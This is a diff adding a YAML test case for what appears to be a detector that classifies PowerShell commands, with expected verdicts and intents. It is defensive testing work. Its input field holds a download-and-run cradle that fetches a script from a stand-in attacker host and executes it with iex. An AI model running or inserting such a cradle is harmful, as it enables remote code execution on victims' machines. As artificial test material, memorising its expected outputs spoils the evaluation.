@@ -1,0 +1,21 @@
+id: T03_download_and_run_cradle
+title: Malicious — canonical download-and-run cradle
+provenance: MalwareBazaar / Empire-style shape · public
+input: 'iex (New-Object Net.WebClient).DownloadString("http://evil.example.com/stage2.ps1")'
+expected_verdict: malicious
+must_fire_intents:
+  - staging
+  - remote_execution
+  - runtime_dependent
+must_not_fire:
+  - credential_access
+forbidden_words_in_verdict:
+  - credential theft
+  - ransomware
+  - cobalt strike
+  - campaign
+must_admit_unknown: false
+notes: >
+  Two high-risk intents fire together (staging + remote_execution).
+  Verdict must be malicious. Tool must NEVER attribute a specific
+  malware family without evidence — the remote content is unknown.
